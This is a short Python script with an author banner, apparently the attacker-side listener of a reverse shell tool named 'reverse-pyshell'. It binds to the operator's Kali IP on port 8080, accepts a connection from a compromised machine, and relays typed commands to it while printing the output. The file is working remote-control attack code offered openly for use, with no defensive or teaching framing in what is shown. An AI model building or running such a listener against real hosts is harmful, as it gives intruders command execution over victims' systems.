#!usr/bin/env python3

import socket

RED = '\033[31m'
RESET = '\033[0m'
BOLD = '\033[1m'

banner = f"""{RED}{BOLD}
                                              (       )     (    (     
                                              )\ ) ( /(     )\ ) )\ )  
 (     (   )     (  (        (           (   (()/( )\())(  (()/((()/(  
 )(   ))\ /((   ))\ )(  (   ))\ ___`  )  )\ ) /(_)((_)\ )\  /(_))/(_)) 
(()\ /((_(_))\ /((_(()\ )\ /((_|___/(/( (()/((_))  _((_((_)(_)) (_))   
 ((_(_)) _)((_(_))  ((_((_(_))    ((_)_\ )(_)/ __|| || | __| |  | |    
| '_/ -_)\ V // -_)| '_(_-/ -_)   | '_ \| || \__ \| __ | _|| |__| |__  
|_| \___| \_/ \___||_| /__\___|   | .__/ \_, |___/|_||_|___|____|____| 
                                  |_|    |__/                           

                                  Author  : Naresh
                                  Github  : https://github.com/theNareshofficial
                                  Youtube : https://www.youtube.com/@nareshtechweb930


{RESET}
"""

print(f"{banner}")


ip_addr = "Your Kali IP"         # use your kali IP address
port = 8080                      # use any port


def connect():          

    try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((ip_addr, port))
            s.listen(1)

            print("[!] Listening TCP connection from PORT 8080")

            
            conn, addr = s.accept()

            print("[+] We got a connection from : ", addr)
    except Exception as e:
         print("[!] Connection Error : ",e)

    while True:

        command = input("SHELL>>>").encode()

        if b"terminate" in command:
            conn.send(b"terminate")
            conn.close()
            break
        else:
            conn.send(command)
            response = conn.recv(1024)
            print(response.decode())

def main():
    connect()

if __name__ == "__main__":
    main()
